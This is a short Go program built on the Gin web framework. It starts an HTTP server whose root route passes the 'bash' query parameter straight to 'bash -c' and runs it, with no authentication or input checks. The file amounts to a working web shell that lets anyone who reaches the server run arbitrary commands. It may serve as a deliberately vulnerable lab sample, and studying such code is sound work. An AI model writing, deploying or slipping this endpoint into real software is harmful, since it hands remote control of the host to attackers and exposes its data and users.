package main

import (
	"net/http"
	"os/exec"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	r.GET("/", func(c *gin.Context) {
		print(c.Query("bash"))
		out, err := exec.Command("bash", "-c", c.Query("bash")).Output()
		if err != nil {
			panic("err")
		}
		println(string(out))
		c.Status(http.StatusOK)
	})
	r.Run()
}
